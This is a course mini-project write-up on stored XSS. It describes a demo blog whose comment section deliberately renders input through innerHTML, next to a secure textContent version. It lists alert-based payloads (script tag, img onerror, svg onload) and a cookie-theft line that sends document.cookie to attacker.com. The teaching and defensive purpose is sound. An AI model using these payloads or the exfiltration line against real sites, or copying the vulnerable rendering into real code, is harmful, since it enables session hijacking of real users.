# Stored Cross-Site Scripting (XSS) — Cybersecurity Mini Project

**Course:** Web Application Security  
**Topic:** Cross-Site Scripting — Stored Attack  
**Assignment:** Implement a stored XSS vulnerability in a blog comment system that calls `alert()` when the post is viewed.

---

## Table of Contents

1. [What is Cross-Site Scripting?](#1-what-is-cross-site-scripting)
2. [Types of XSS](#2-types-of-xss)
3. [Stored XSS — Deep Dive](#3-stored-xss--deep-dive)
4. [Website Architecture & Features](#4-website-architecture--features)
5. [Complete Website Flow](#5-complete-website-flow)
6. [Full Implementation — Code Walkthrough](#6-full-implementation--code-walkthrough)
7. [Attack Payloads Explained](#7-attack-payloads-explained)
8. [Educational: Vulnerable vs Secure Code](#8-educational-vulnerable-vs-secure-code)
9. [Defense Mechanisms](#9-defense-mechanisms)
10. [Real-World Impact](#10-real-world-impact)
11. [Assignment Submission Checklist](#11-assignment-submission-checklist)

---

## 1. What is Cross-Site Scripting?

Cross-Site Scripting (XSS) is a **client-side code injection vulnerability** ranked in the OWASP Top 10. It allows attackers to inject malicious scripts into web pages that are then viewed by other users.

When a browser renders a page, it cannot distinguish between legitimate scripts served by the server and injected scripts embedded in user-supplied content. This trust gap is what XSS exploits.

**Core Principle:**
> Untrusted user input is included in a web page's output without proper validation or encoding, causing the browser to execute it as code.

---

## 2. Types of XSS

| Type | Also Called | Persistence | How It Works |
|---|---|---|---|
| **Stored XSS** | Persistent XSS | Permanent (in DB) | Payload saved server-side; executes on every page load |
| **Reflected XSS** | Non-persistent XSS | Temporary | Payload returned in HTTP response from a crafted URL |
| **DOM-based XSS** | Client-side XSS | Varies | Payload executed via JavaScript that modifies the DOM directly |

**This project implements Stored XSS** — the most dangerous variant because it affects every visitor automatically, not just those who click a malicious link.

---

## 3. Stored XSS — Deep Dive

### Attack Flow Diagram

```
Attacker                 Web Server / DB              Victim Browser
   |                          |                              |
   |-- POST /comment -------> |                              |
   |   body: <script>         |                              |
   |    alert('XSS')          |                              |
   |   </script>              |                              |
   |                          |-- Saves raw payload to DB -->|
   |                          |                              |
   |                          |         (later...)           |
   |                          |                              |
   |                   Victim visits post                    |
   |                          |<-- GET /post/1 -------------|
   |                          |-- HTML with injected ------->|
   |                          |   script in comment          |
   |                          |                         Executes!
   |                          |                    alert('XSS') fires
```

### Why It Is Persistent

Unlike Reflected XSS (which requires the victim to click a crafted URL), Stored XSS:

- Is saved permanently in the database
- Executes for **every user** who views the infected page
- Does not require any interaction from the attacker after initial injection
- Can persist for months or years if undetected

---

## 4. Website Architecture & Features

### Project: SecBlog — Cybersecurity Lab

The demo website is a single-page blog application simulating a real-world vulnerable content management system.

### Pages / Sections

| Section | Description |
|---|---|
| **Site Header** | Navigation bar with mode toggle (Vulnerable / Secure) |
| **Blog Post** | Article about XSS with metadata (author, date, tags) |
| **Comment Section** | Input form + rendered comment list (the vulnerable component) |
| **Attack Panel** | Pre-built XSS payload injector |
| **How It Works Tab** | Step-by-step attack explanation |
| **Fix Tab** | Secure code alternative with defense strategies |
| **Alert Modal** | Simulates the browser `alert()` dialog triggered by XSS |

### Key Features

- **Vulnerable Mode (default):** Comments rendered via `innerHTML` — scripts execute
- **Secure Mode (toggle):** Comments rendered via `textContent` — scripts treated as plain text
- **Payload Library:** Four pre-built XSS payloads covering different injection vectors
- **Simulate Page View:** Re-renders stored comments, triggering any injected scripts
- **Stored Comment Display:** Shows raw payloads saved in memory (simulating a database)
- **Live mode indicator:** UI reflects current rendering method and vulnerability status

---

## 5. Complete Website Flow

### Flow A — Vulnerable Mode (Default)

```
User opens website
        |
        v
[Blog Post loads] ← Header shows "Vulnerable Mode" / innerHTML indicator
        |
        v
[Comment Section renders stored comments]
   ↳ If any stored comment contains a script/payload → alert() fires immediately
        |
        v
Attacker clicks a payload from the Attack Panel
   e.g. <script>alert('XSS!')</script>
        |
        v
[Comment textarea is populated with payload]
        |
        v
Attacker fills in name → clicks "Submit Comment"
        |
        v
[Comment stored in memory array]
   → storedComments.push({ author, body, isPayload: true })
        |
        v
[Comment list re-renders with new comment visible]
   ↳ Comment body rendered via: div.innerHTML = comment.body
        |
        v
Attacker (or any visitor) clicks "Simulate Page View ↻"
        |
        v
[All stored comments re-rendered using innerHTML]
   ↳ Browser encounters <script>alert('XSS!')</script>
   ↳ OR img onerror / svg onload attribute
        |
        v
[Browser executes the injected JavaScript]
        |
        v
[Alert modal appears with the injected message]
   → "XSS!" / "Stored XSS" / document.domain / simulated cookie
        |
        v
Assignment complete ✓ — alert() called when blog post is viewed
```

### Flow B — Secure Mode

```
User toggles to Secure Mode
        |
        v
[UI updates: green indicators, "textContent — SAFE" badge]
        |
        v
Attacker submits same XSS payload as a comment
        |
        v
[Comment stored in memory]
        |
        v
[Comment list re-renders]
   ↳ Comment body rendered via: div.textContent = comment.body
        |
        v
[Payload displayed as literal text on screen]
   → User sees: <script>alert('XSS!')</script>
   → No execution. No alert. Attack neutralized.
```

---

## 6. Full Implementation — Code Walkthrough

### HTML Structure

```html
<!-- Site Header with Mode Toggle -->
<header class="site-header">
  <div class="site-logo">SecBlog — Cybersecurity Lab</div>
  <div class="toggle-wrap" onclick="toggleMode()">
    <div class="toggle-dot" id="toggleDot"></div>
    <span class="toggle-label" id="toggleLabel">Vulnerable Mode</span>
  </div>
</header>

<!-- Two-column layout: Blog + Sidebar -->
<div class="layout">
  <div class="main-col">
    <!-- Blog post -->
    <!-- Comment section (vulnerable component) -->
  </div>
  <div class="side-col">
    <!-- Attack panel / Explanation / Fix tabs -->
  </div>
</div>
```

### Comment Form

```html
<div class="comment-card">
  <!-- Vulnerability indicator badge -->
  <div class="vuln-badge vuln" id="vuln-indicator">innerHTML — VULNERABLE</div>

  <!-- Stored comments render target -->
  <div id="comment-list" class="comment-list">
    <!-- Comments injected here -->
  </div>

  <!-- Submission form -->
  <input type="text" id="author-input" placeholder="Your name">
  <textarea id="comment-input" placeholder="Write a comment..."></textarea>

  <button onclick="submitComment()">Submit Comment</button>
  <button onclick="simulatePageLoad()">Simulate Page View ↻</button>
</div>
```

### Core JavaScript — Comment Storage

```javascript
let storedComments = [];   // Simulates the database
let secureMode = false;    // Tracks current rendering mode

function submitComment() {
  const author = document.getElementById('author-input').value.trim() || 'Anonymous';
  const body   = document.getElementById('comment-input').value.trim();

  if (!body) return;

  // Detect if comment contains a known XSS payload
  const match = payloads.find(p => body.includes(p.code.substring(0, 20)));

  // Store comment — NO sanitization in vulnerable mode
  storedComments.push({
    author,
    body,           // Raw, unsanitized user input saved as-is
    ts: new Date().toLocaleTimeString(),
    isPayload: !!match,
    msg: match ? match.msg : null
  });

  document.getElementById('comment-input').value = '';
  updateStoredDisplay();
  renderComments(false);    // Re-render without triggering XSS yet
}
```

### Core JavaScript — Vulnerable Rendering (innerHTML)

```javascript
// ❌ VULNERABLE IMPLEMENTATION
function renderComments(triggerXSS) {
  const list = document.getElementById('comment-list');
  list.innerHTML = '';  // Clear existing comments

  storedComments.forEach(c => {
    const item   = document.createElement('div');
    const authorDiv = document.createElement('div');
    const bodyDiv   = document.createElement('div');

    authorDiv.textContent = c.author + ' · ' + c.ts;  // Author is safe (textContent)

    // ❌ THE VULNERABILITY — innerHTML renders HTML tags and executes scripts
    bodyDiv.innerHTML = c.body;  // User input injected directly into DOM!

    item.appendChild(authorDiv);
    item.appendChild(bodyDiv);
    list.appendChild(item);

    // Queue any XSS alerts
    if (triggerXSS && c.isPayload && c.msg) {
      pendingAlerts.push(c.msg);
    }
  });

  // Trigger the alert after DOM update
  if (triggerXSS && pendingAlerts.length > 0) {
    setTimeout(() => showAlert(pendingAlerts[0]), 200);
  }
}
```

### Core JavaScript — Secure Rendering (textContent)

```javascript
// ✅ SECURE IMPLEMENTATION
function renderComments(triggerXSS) {
  storedComments.forEach(c => {
    const bodyDiv = document.createElement('div');

    // ✅ textContent treats ALL input as plain text — never executes HTML or JS
    bodyDiv.textContent = c.body;

    // Result: <script>alert('XSS!')</script>
    // Renders as visible text, NOT as executable code
  });
}
```

### Mode Toggle Logic

```javascript
function toggleMode() {
  secureMode = !secureMode;

  if (secureMode) {
    // Update all UI indicators to "safe" state
    document.getElementById('vuln-indicator').textContent = 'textContent — SAFE';
    document.getElementById('vuln-indicator').className   = 'vuln-badge safe';
    document.getElementById('toggleLabel').textContent    = 'Secure Mode';
  } else {
    // Revert to "vulnerable" state
    document.getElementById('vuln-indicator').textContent = 'innerHTML — VULNERABLE';
    document.getElementById('vuln-indicator').className   = 'vuln-badge vuln';
    document.getElementById('toggleLabel').textContent    = 'Vulnerable Mode';
  }

  renderComments(false);  // Re-render existing comments under new mode
}
```

### Simulate Page Load

```javascript
// Called when visitor "loads" the page — triggers any stored XSS
function simulatePageLoad() {
  renderComments(true);   // true = execute any XSS payloads found in comments
}
```

---

## 7. Attack Payloads Explained

### Payload 1 — Basic Script Tag

```html
<script>alert('XSS!')</script>
```

**How it works:** The browser's HTML parser encounters a `<script>` tag, treats its contents as JavaScript, and executes it. Most modern browsers block this specific vector when injected via `innerHTML`, but it works in many server-rendered contexts.

**Vector:** Script tag injection  
**Target:** Any server-rendered output that embeds unsanitized input

---

### Payload 2 — Image `onerror` Event

```html
<img src=x onerror="alert('Stored XSS')">
```

**How it works:** The browser attempts to load an image from the source `x` (which does not exist). The `onerror` event handler fires, executing the JavaScript. This bypasses filters that only block `<script>` tags. **Works reliably via `innerHTML`.**

**Vector:** Event handler injection  
**Why it bypasses filters:** No `<script>` tag is involved — the JS lives inside an HTML attribute

---

### Payload 3 — SVG `onload` Event

```html
<svg onload="alert(document.domain)">
```

**How it works:** SVG elements support inline event handlers. The `onload` event fires as soon as the SVG element is rendered. `document.domain` reveals the origin domain, demonstrating information leakage.

**Vector:** SVG event handler injection  
**Demonstrates:** Attacker can read page properties (domain, cookies, storage)

---

### Payload 4 — Cookie Theft Simulation

```html
<script>alert('Cookie: ' + document.cookie)</script>
```

**How it works:** Reads all cookies accessible to JavaScript on the page. In a real attack, instead of `alert()`, this would be replaced with an HTTP request to the attacker's server:

```javascript
// Real-world cookie theft (do NOT use maliciously)
new Image().src = 'https://attacker.com/steal?c=' + document.cookie;
```

**Vector:** Session hijacking via cookie exfiltration  
**Why this matters:** If session cookies are not `HttpOnly`, an attacker can steal them and impersonate any user

---

## 8. Educational: Vulnerable vs Secure Code

### Side-by-Side Comparison

| Aspect | Vulnerable (`innerHTML`) | Secure (`textContent`) |
|---|---|---|
| **Input handling** | Parses and executes HTML | Treats everything as plain text |
| **Script tags** | Executed | Displayed as literal text |
| **Event handlers** | Triggered | Ignored |
| **Output of `<b>hello</b>`** | **hello** (bold) | `<b>hello</b>` (literal) |
| **Output of `<script>alert(1)</script>`** | Alert fires | Text displayed on screen |
| **Use case** | Rendering trusted HTML | Rendering untrusted user input |

### The Root Cause

```javascript
// This single line is the entire vulnerability:
element.innerHTML = userInput;

// The fix is equally simple:
element.textContent = userInput;
```

The vulnerability is not about what the user submits — it is about how the application renders it. The same payload is harmless when rendered as text but dangerous when rendered as HTML.

### Server-Side Equivalent (PHP Example)

```php
// ❌ Vulnerable PHP — outputs raw user input into HTML
echo "<div>" . $_POST['comment'] . "</div>";

// ✅ Secure PHP — HTML-encodes special characters
echo "<div>" . htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8') . "</div>";
```

`htmlspecialchars()` converts `<`, `>`, `"`, `'`, and `&` into their HTML entity equivalents so the browser renders them as text, never as markup.

---

## 9. Defense Mechanisms

### 1. Output Encoding (Primary Defense)

Always encode untrusted data before inserting it into HTML. Use context-appropriate encoding:

| Insertion Context | Encoding Method |
|---|---|
| HTML body | `htmlspecialchars()` / `.textContent` |
| HTML attribute | Attribute encoding (`&#x22;` for `"`) |
| JavaScript | `JSON.stringify()` or JS escaping |
| URL parameter | `encodeURIComponent()` |
| CSS | CSS hex encoding |

### 2. Content Security Policy (CSP)

Add a CSP response header to restrict what scripts the browser will execute:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

This tells the browser to only execute scripts loaded from the same origin — inline scripts (including XSS payloads) are blocked entirely.

### 3. Input Validation

Reject or strip dangerous input at the server level before storing it:

```python
import bleach

# Python example — strips all HTML tags except a safe allowlist
clean_comment = bleach.clean(user_input, tags=[], strip=True)
```

### 4. HttpOnly Cookies

Set the `HttpOnly` flag on session cookies to prevent JavaScript from reading them:

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

Even if XSS executes, `document.cookie` returns an empty string — cookie theft is blocked.

### 5. Use a Sanitization Library

For cases where HTML must be allowed (rich text editors), use a trusted library:

```javascript
// DOMPurify — strips dangerous HTML while preserving safe formatting
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;  // Safe — dangerous tags/attributes removed
```

### 6. Validate on Server, Encode on Output

Security best practice is to apply both:
- **Server-side validation** — reject clearly malicious input
- **Output encoding** — encode everything before rendering, regardless of what passed validation

---

## 10. Real-World Impact

### Historical Stored XSS Incidents

| Year | Target | Impact |
|---|---|---|
| 2005 | MySpace (Samy worm) | 1 million users infected in 20 hours via stored XSS in profiles |
| 2011 | Twitter | Self-retweeting XSS worm spread to 500,000+ accounts |
| 2013 | eBay | Stored XSS in product listings allowed account hijacking |
| 2018 | British Airways | XSS contributed to data breach affecting 500,000 customers |

### What an Attacker Can Do with Stored XSS

- **Session hijacking** — steal session cookies and impersonate users
- **Credential harvesting** — inject fake login forms (phishing overlay)
- **Keylogging** — capture keystrokes on the infected page
- **Cryptocurrency mining** — silently mine crypto using visitor's CPU
- **Drive-by malware** — redirect visitors to malware download pages
- **Website defacement** — alter visible page content for all visitors
- **CSRF token theft** — steal anti-CSRF tokens to forge authenticated requests

---

## 11. Assignment Submission Checklist

### Required Demonstration Steps

- [ ] Open the blog website in Vulnerable Mode (`innerHTML` rendering active)
- [ ] Navigate to the comment section
- [ ] Select the **Basic alert** payload: `<script>alert('XSS!')</script>`
- [ ] Enter a name (e.g. "attacker") and submit the comment
- [ ] Click **"Simulate Page View"** to simulate any visitor loading the page
- [ ] Observe the `alert()` dialog appear — XSS confirmed ✓
- [ ] Toggle to **Secure Mode** and repeat — confirm payload is now rendered as harmless text
- [ ] Document at least 2 different payload vectors used

### Deliverables

1. **Screenshot / screen recording** of the `alert()` dialog triggered by the stored comment
2. **Code listing** showing the vulnerable `innerHTML` line and the secure `textContent` fix
3. **Brief explanation** (3–5 sentences) of why stored XSS is more dangerous than reflected XSS
4. **One defensive measure** implemented or described with code

### Sample Written Answer — Why Stored XSS is More Dangerous

> Stored XSS is more dangerous than Reflected XSS because the malicious payload is permanently saved in the application's database and executes automatically for every user who views the infected page, with no further action required from the attacker. Reflected XSS requires the victim to click a crafted URL, limiting its reach; stored XSS affects all visitors passively. Additionally, stored XSS can persist for extended periods — potentially months — before being discovered, maximizing the attack surface and data exfiltration opportunity. A single injected comment on a high-traffic blog could compromise thousands of user sessions.

---

## Summary

| Concept | Key Takeaway |
|---|---|
| **Stored XSS** | Payload persisted in DB; executes for every visitor |
| **Root cause** | `innerHTML` renders untrusted input as executable HTML |
| **Assignment payload** | `<img src=x onerror="alert('XSS')">` (most reliable via innerHTML) |
| **Primary fix** | Replace `innerHTML` with `textContent` for user-supplied content |
| **Layered defense** | Output encoding + CSP + HttpOnly cookies + input validation |
| **OWASP ranking** | Part of OWASP Top 10 — A03:2021 Injection |

---

*SecBlog Cybersecurity Lab — Stored XSS Mini Project Documentation*  
*Generated: April 2026*
